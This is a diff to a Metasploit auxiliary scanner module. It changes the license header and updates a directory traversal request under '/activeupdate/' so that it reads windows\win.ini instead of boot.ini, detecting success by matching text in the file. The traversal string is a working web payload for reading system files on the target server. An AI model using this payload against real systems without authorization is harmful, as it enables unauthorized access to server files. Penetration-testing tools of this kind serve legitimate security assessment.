@@ -1,8 +1,6 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
@@ -42,7 +40,7 @@ class Metasploit3 < Msf::Auxiliary
 
     res = send_request_raw(
       {
-        'uri'     => '/activeupdate/../../../../../../../../../../../boot.ini',
+        'uri'     => '/activeupdate/../../../../../../../../../../../windows\\win.ini',
         'method'  => 'GET',
       }, 20)
 
@@ -54,7 +52,7 @@ class Metasploit3 < Msf::Auxiliary
     http_fingerprint({ :response => res })
 
     if (res.code >= 200)
-      if (res.body =~ /boot/)
+      if (res.body =~ /for 16-bit app support/)
         vuln = "vulnerable."
       else
         vuln = "not vulnerable."
